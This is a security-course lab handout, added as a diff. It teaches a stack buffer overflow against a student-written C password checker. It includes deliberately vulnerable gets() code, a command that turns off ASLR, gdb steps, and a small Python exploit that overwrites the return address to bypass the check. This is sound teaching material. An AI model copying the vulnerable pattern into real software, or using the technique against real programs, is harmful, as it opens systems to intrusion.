@@ -1,0 +1,450 @@
+
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Project 2: Linux Buffer Overflow Without Shellcode</title>
+</head>
+<body bgcolor="#cccccc">
+<h1>Project 2: No Shellcode -> Linux Buffer Overflow</h1>
+<h2>What You Need</h2>
+A 32-bit x86 Kali Linux machine or any linux, real or virtual. The project was
+written for Kali 1, but it works the same way on Kali 2--the only
+difference is the address to jump to. 
+<h2>Purpose</h2>
+In this lab activity you will revisit C programming in its use 
+in a common vulnerability of a Buffer Overflow.
+To develop a very simple buffer overflow
+exploit in Linux, that alters execution to
+bypass a password. This will give you
+practice with these techniques:
+<ul>
+<li>Writing very simple C code
+</li><li>Compiling with gcc
+</li><li>Debugging with gdb
+</li><li>Understanding the registers $esp, $ebp, and $eip
+</li><li>Understanding the structure of the stack
+</li><li>Using Python to create simple text patterns
+</li></ul>
+<h2>Disabling ASLR</h2>
+Address Space Layout Randomization is
+a defense feature to make buffer
+overflows more difficult, and Kali Linux
+uses it by default.
+<p>
+This makes you much safer, but it's
+an irritation we don't need for this
+project, so we'll turn it off.
+</p><p>
+In a Terminal, execute this command:
+</p><blockquote><pre><code><big><b>
+echo 0 &gt; /proc/sys/kernel/randomize_va_space
+</b></big></code></pre></blockquote>
+<h2>Creating a Vulnerable Program</h2>
+This program asks for a password.
+The function test_pw uses simple
+bitwise manipulations to obfuscate the
+password comparison, so that the
+correct password is not literal in the
+source code.
+<p>
+In a Terminal window,
+execute this command:
+</p><blockquote><pre><code><big><b>
+nano pwd.c
+</b></big></code></pre></blockquote>
+Enter this code:
+<blockquote><pre><code><big><b>
+#include &lt;stdio.h&gt;
+
+int test_pw()
+{
+        char pin[10];
+        int x=15, i;
+        printf("Enter password: ");
+        gets(pin);
+        for (i=0; i&lt;10; i+=2) x = (x &amp; pin[i]) | pin[i+1];
+        if (x == 48) return 0;
+        else return 1;
+}
+
+void main()
+{
+        if (test_pw()) printf("Fail!\n");
+        else printf("You win!\n");
+}
+</b></big></code></pre></blockquote>
+Your screen should look like this,
+without the explanatory boxes and arrows:
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/lbuf2-1a.png">
+</p><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>,
+<b>Enter</b>.
+</p><p>
+Execute these commands to compile the code
+and run it.
+</p><p>
+<i>
+Since version 2017.1, Kali includes
+a version of gcc that creates Position
+Independent Executables by default, which
+breaks this project.
+The "-static --no-pie" options
+tell gcc to make the older-style executable
+file we need.
+</i>
+</p><blockquote><pre><code><big><b>
+gcc -g -static --no-pie -o pwd pwd.c
+
+./pwd
+</b></big></code></pre></blockquote>
+You should see compiler warnings, but
+no errors.
+<p>
+Enter a password of <b>aaa</b> and
+press Enter.
+</p><p>
+The program exits normally, wth the
+"Fail!" message, as shown below.
+</p><p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2a.png">
+</p><p>
+If we knew the correct password, we could
+get to the "You Win!" message. But we'll
+get there by exploiting an overflow instead.
+</p><p>
+Execute the program again, with a password
+40 characters long, as shown below.
+</p><p>
+The "Segmentation fault" message indicates
+a buffer overflow.
+</p><p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2b-lbuf2j.png">
+</p><p>
+</p><h2>Saving a Screen Image</h2>
+Make sure "<b>Segmentation fault</b>" message is visible.
+<p>
+Press the <b>PrintScrn</b> key to copy the whole desktop to the clipboard.
+</p><p>
+<b>YOU MUST SUBMIT A FULL-SCREEN IMAGE FOR FULL CREDIT!</b>
+</p><p>
+
+</p><p>
+Save the document with the filename "<b>YOUR NAME Project 2</b>", replacing "YOUR NAME" with your real name.
+</p><h2>Debugging the Program</h2>
+Execute these commands to run the file
+in the gdb debugging environment,
+list the source code of the
+test_pw function, and set two breakpoints.
+<p>
+The "-q" option tells gdb to run in
+"quiet" mode, that is, not to display
+its banner message.
+</p><blockquote><pre><code><big><b>
+gdb -q pwd
+list 1,12
+break 8
+break 10
+</b></big></code></pre></blockquote>
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2b.png">
+</p><p>
+</p><h2>Normal Execution</h2>
+In the gdb debugging environment,
+execute these commands:
+<blockquote><pre><code><big><b>
+run
+info registers
+</b></big></code></pre></blockquote>
+The code runs to the breakpoint,
+and shows the registers, as shown below.
+(Your address values may be different.)
+<p>
+The important registers for us now
+are:
+</p><ul>
+<li><b>$eip</b> (extended instruction pointer)
+</li><li><b>$esp</b> (the top of the stack frame)
+</li><li><b>$ebp</b> (the bottom of the stack frame)
+</li></ul>
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2o.png">
+</p><p>
+Notice that $eip has an address
+of &lt;test_pw+43&gt; (or something similar)
+-- that is,
+inside the
+test_pw function.
+</p><p>
+$esp is the start of the stack,
+at 0xbffff610 in the image above.
+</p><p>
+$ebp is 0xbffff638 in the image above -- this
+is the end of the "stack frame" containing
+local variables for the test_pw function,
+and other information.
+</p><h2>Examining the Stack Frame</h2>
+In the gdb debugging environment,
+execute this command:
+<blockquote><pre><code><big><b>
+x/20x $esp
+</b></big></code></pre></blockquote>
+This command is short for
+"eXamine 20 heXadecimal 32-bit words, starting at
+$esp". It shows the stack frame,
+as shown below.
+<p>
+The highlighted region is the stack frame for test_pw(). It starts at the 32-bit word pointed to by $esp and continues through the 32-bit word pointed to by $ebp.
+</p><p>
+The next word after the stack frame, at address
+0xbffff63c, is 0x080488d4. This is the RET value,
+and it will be placed into $eip when the
+test_pw function returns to main.
+</p><p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2p.png">
+</p><p>
+</p><h2>Overflowing the Stack with 40 Characters</h2>
+In the gdb debugging environment,
+execute this command to continue the
+program:
+<blockquote><pre><code><big><b>
+continue
+</b></big></code></pre></blockquote>
+At the "Enter password" prompt, type in this
+40-character password, and then press Enter:
+<blockquote><pre><code><big><b>
+AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTT
+</b></big></code></pre></blockquote>
+The program proceeds to the next breakpoint.
+<p>
+Execute this command to see the stack:
+</p><blockquote><pre><code><big><b>
+x/20x $esp
+</b></big></code></pre></blockquote>
+As you can see, the RET value now contains
+0x51515050 -- hexadecimal codes for "PPQQ"
+in reverse order, as you can see in the ASCII
+table below.
+<p><img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2e.png"></p><p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/asciifull.gif" width="894" height="610">
+</p><p>
+In the gdb debugging environment,
+execute this command to continue the
+program:
+</p><blockquote><pre><code><big><b>
+continue
+</b></big></code></pre></blockquote>
+The program halts with a "Segmentation fault",
+as shown below.
+<p>
+In the gdb debugging environment,
+execute this command:
+</p><blockquote><pre><code><big><b>
+info registers
+</b></big></code></pre></blockquote>
+As shown below, the $eip now contains
+<b>0x51515050</b>. The 4 characters
+"PPQQ" end up in $eip.
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2fh.png">
+</p><p>
+</p><h2>Saving a Screen Image</h2>
+Make sure the <b>eip</b> line shows <b>0x51515050</b>,
+as highlighted in the image above.
+<p>
+Press the <b>PrintScrn</b> key to copy the whole desktop to the clipboard.
+</p><p>
+<b>YOU MUST SUBMIT A FULL-SCREEN IMAGE FOR FULL CREDIT!</b>
+</p><p>
+
+</p><p>
+Save the document with the filename "<b>YOUR NAME Proj 2b</b>", replacing "YOUR NAME" with your real name.
+</p><h2>Selecting a Location</h2>
+We can make the program go to any address
+we like now.
+<p>
+To see the addresses in main, execute
+this command:
+</p><blockquote><code><big><b>
+disassemble main
+</b></big></code></blockquote>
+There are two calls to "puts" in main. The
+first one prints the "Fail!"
+message, and the second one
+prints the "You Win!" message.
+<p>
+To get "You Win!", we need to jump
+to the "push" instruction before the second
+call to "puts".
+</p><p>
+When I did it, that address was
+0x080488ed,
+as shown below:
+</p><p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2qh.png">
+</p><p>
+</p><h2>Quitting the Debugger</h2>
+In the gdb debugging environment,
+execute this command:
+<blockquote><pre><code><big><b>
+quit
+</b></big></code></pre></blockquote>
+At the "Quit anyway? (y or n)" prompt,
+type <b>y</b> and press <b>Enter</b>.
+<p>
+</p><h2>Using Python to Create an Exploit File</h2>
+In a Terminal window,
+execute this command:
+<blockquote><pre><code><big><b>
+nano exploit-pwd
+</b></big></code></pre></blockquote>
+Type in the code shown below. This puts in
+the same string we used before, replacing
+"PPQQ" with the four bytes of the desired address,
+0x080488ed, in reverse order:
+<blockquote><pre><code><big><b>
+#!/usr/bin/python
+import sys
+sys.stdout.write("AABBCCDDEEFFGGHHIIJJKKLLMMNNOO\xed\x88\x04\x08")
+</b></big></code></pre></blockquote>
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2r.png">
+</p><p>
+"sys.stdout.write" is used here to prevent
+Python from adding a linefeed at the
+end of the text.
+</p><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>,
+<b>Enter</b>.
+</p><p>
+Next we need to make the program
+executable and run it.
+</p><p>
+In a Terminal window,
+execute these commands.
+</p><blockquote><pre><code><big><b>
+chmod a+x exploit-pwd
+
+./exploit-pwd
+</b></big></code></pre></blockquote>
+The program prints out
+some characters,
+ending with unprintable ones,
+as shown below.
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2k.png">
+</p><p>
+We can't easily copy and paste strings
+that contain
+strange characters like that, so
+we need to put the output into a file
+named attack-pwd.
+</p><p>
+In a Terminal window,
+execute these commands.
+</p><p>
+<i>Note that the second command begins with
+"LS -L " in lowercase characters.</i>
+</p><blockquote><pre><code><big><b>
+./exploit-pwd &gt; attack-pwd
+
+ls -l attack-pwd
+</b></big></code></pre></blockquote>
+This creates a file named "attack-pwd"
+containing 34 characters,
+as shown below.
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2l.png">
+</p><p>
+</p><h2>Testing the Exploit in the Debugger</h2>
+Exploits almost never work the first time,
+so you need to know how to test them in a
+debugger.
+<p>
+Execute these commands to load the file
+in the gdb debugging environment,
+list the source code of the test_pw
+function, and set a breakpoint
+after the password is input:
+</p><blockquote><pre><code><big><b>
+gdb -q pwd
+list 1,12
+break 10
+</b></big></code></pre></blockquote>
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2m.png">
+</p><p>
+Execute this command to run the file
+in the gdb debugging environment,
+with input from the
+"attack-pwd" file,
+show registers,
+and show the stack:
+</p><blockquote><pre><code><big><b>
+run --args &lt; attack-pwd
+info registers
+x/20x $esp
+</b></big></code></pre></blockquote>
+As you can see below, the RET value
+(just after the highlighted section)
+is now 0x080488ed -- the value we
+chose earlier.
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2s.png">
+</p><p>
+Execute this command to continue
+executing the file:
+</p><blockquote><pre><code><big><b>
+continue
+</b></big></code></pre></blockquote>
+We get the "You Win!" message,
+as desired. Then, the program crashes
+because the stack is corrupted and it
+cannot return normally from main,
+but that's OK for now.
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2t.png">
+</p><p>
+</p><h2>Quitting the Debugger</h2>
+In the gdb debugging environment,
+execute this command:
+<blockquote><pre><code><big><b>
+quit
+</b></big></code></pre></blockquote>
+At the "Quit anyway? (y or n)" prompt,
+type <b>y</b> and press <b>Enter</b>.
+<p>
+</p><h2>Testing the Exploit in the Shell</h2>
+The debugging environment is not perfect,
+so some exploits that work in the debugger
+don't work against real running code.
+<p>
+Execute this command to run the exploit
+on the real pwd executable:
+</p><blockquote><pre><code><big><b>
+./pwd &lt; attack-pwd
+</b></big></code></pre></blockquote>
+As you can see, we get the
+"<b>You Win!</b>" message. The exploit works!
+<p>
+<img src="./Proj 2_ Linux Buffer Overflow Without Shellcode_files/p2c-lbuf2u.png">
+</p><p>
+</p><h2>Saving a Screen Image</h2>
+Make sure the "<b>You Win!</b>" message is visible.
+<p>
+Press the <b>PrintScrn</b> key to copy the whole desktop to the clipboard.
+</p><p>
+<b>YOU MUST SUBMIT A FULL-SCREEN IMAGE FOR FULL CREDIT!</b>
+</p><p>
+
+</p><p>
+Save the document with the filename "<b>YOUR NAME Project 2</b>", replacing "YOUR NAME" with your real name.
+</p><h2>Turning in your Project</h2>
+ <b></b> 
+<b>Proj 2 from YOUR NAME</b>
+<hr>
+ <br>
+ <br>
+ <br>
+
+
+</body></html>
